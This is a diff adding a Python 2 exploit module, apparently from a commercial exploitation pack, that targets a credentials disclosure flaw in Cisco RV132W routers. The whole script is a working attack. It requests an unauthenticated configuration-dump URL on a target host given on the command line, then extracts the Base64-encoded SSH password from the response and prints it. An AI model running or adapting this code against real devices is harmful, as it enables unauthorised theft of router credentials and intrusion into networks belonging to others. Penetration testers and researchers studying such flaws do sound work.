@@ -1,0 +1,51 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+import base64
+
+_name_   = 'd2sec_cisco_2'
+_vendor_ = 'cisco'
+_model_  = ['RV132W']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://blogs.securiteam.com/index.php/archives/3590'
+_port_   = 443
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'https://%s:%d/dumpmdm.cmd' % (host,port)       
+    response = requests.get(url, verify=False, timeout=10)  
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if 'sshpass' in response.text:
+    print '[+] %s vulnerable\n' % host
+    m = re.search(';sshpass&gt;([^;]+)&lt;/sshpass', response.text)
+    if m is None:
+      print '[+] Credentials not found'
+      print response.text.encode('utf-8')        
+    else:                       
+      sshpass = m.group(1)                                          
+      print 'Base64 encoded SSH password: %s'%sshpass
+      #print 'SSH password: %s'%base64.b64decode(sshpass)
+      print '===\n\n%s'%response.text.encode('utf-8')
+  else:            
+    print '[+] %s not vulnerable' % host
+    print '===\n\n%s'%response.text.encode('utf-8')
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
